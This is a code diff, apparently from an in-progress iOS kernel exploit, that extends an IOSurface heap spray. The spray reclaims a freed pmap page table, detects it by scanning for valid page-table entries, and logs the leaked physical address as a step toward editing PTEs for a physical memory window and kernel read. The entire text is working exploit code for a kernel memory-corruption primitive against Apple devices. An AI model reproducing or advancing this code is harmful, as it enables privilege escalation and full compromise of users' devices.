@@ -314,16 +314,20 @@ after_unmap: ;
             [p084_surfaces addObject:(__bridge_transfer id)s];
         }
         int sig = 0, sigIdx = -1, maxReps = 0;
-        uint64_t sigVal = 0;
+        int weak = 0, weakIdx = -1, weakReps = 0;
+        uint64_t sigVal = 0, weakVal = 0;
         for (NSUInteger i = 0; i < p084_surfaces.count; i++) {
             void *b = surfBase((__bridge void *)p084_surfaces[i]);
             if (!b) continue;
             uint64_t first = 0;
-            int reps = 0;
+            int reps = 0, validCount = 0, validIdx = -1;
+            uint64_t validFirst = 0;
             for (int j = 0; j < (int)(P084_PAGE / 8); j++) {
                 uint64_t v;
                 memcpy(&v, (uint8_t *)b + j * 8, 8);
                 if ((v & 1) == 0) continue;          /* valid PTE bit */
+                validCount++;
+                if (validIdx < 0) { validIdx = j; validFirst = v; }
                 if (first == 0) { first = v; reps = 1; }
                 else if (v == first) reps++;
             }
@@ -332,17 +336,33 @@ after_unmap: ;
                 sig++;
                 if (sigIdx < 0) { sigIdx = (int)i; sigVal = first; }
             }
+            /* The current recipe's single unmap is page 65,536, the first
+               page of the last 32 MB block. That L3 has at most one PTE
+               (index 0) and zeros elsewhere, so the repeated signature above
+               cannot match it. A weak signature = exactly one valid PTE at
+               index 0 with a plausible 16 KB-aligned PA. */
+            if (validCount == 1 && validIdx == 0 &&
+                (validFirst & 0x0000FFFFFFFFC000ULL) != 0) {
+                weak++;
+                if (weakIdx < 0) { weakIdx = (int)i; weakVal = validFirst; weakReps = validCount; }
+            }
         }
-        L([NSString stringWithFormat:@"[D2] IOSurface spray n=%lu signature_surfaces=%d max_reps=%d",
-            (unsigned long)p084_surfaces.count, sig, maxReps]);
+        L([NSString stringWithFormat:@"[D2] IOSurface spray n=%lu signature_surfaces=%d max_reps=%d weak_surfaces=%d",
+            (unsigned long)p084_surfaces.count, sig, maxReps, weak]);
         if (sig > 0) {
             uint64_t pa = sigVal & 0x0000FFFFFFFFC000ULL;
             L([NSString stringWithFormat:@"[**] SURFACE PAGE-TABLE SIGNATURE: surface[%d] repeated=0x%llx reps=%d pa=0x%llx",
                 sigIdx, (unsigned long long)sigVal, maxReps, (unsigned long long)pa]);
             L(@"[**] The freed pmap page table is user-mapped through the surface. "
               @"A v3 PTE edit can turn this into a physical window. NOT hasKread yet.");
+        } else if (weak > 0) {
+            uint64_t pa = weakVal & 0x0000FFFFFFFFC000ULL;
+            L([NSString stringWithFormat:@"[**] SURFACE PAGE-TABLE WEAK SIGNATURE: surface[%d] valid=1 idx=0 value=0x%llx pa=0x%llx",
+                weakIdx, (unsigned long long)weakVal, (unsigned long long)pa]);
+            L(@"[**] This is the last-block L3 shape (one PTE, page 65536). "
+              @"The page table is user-mapped; a v3 PTE edit can map a PA. NOT hasKread yet.");
         } else {
-            L(@"[-] no repeated-PTE surface. The freed pmap page was not reclaimed as a "
+            L(@"[-] no repeated-PTE or single-PTE surface. The freed pmap page was not reclaimed as a "
               @"data page, or it was zeroed on allocation. This is the A12X result reproduced.");
         }
     }
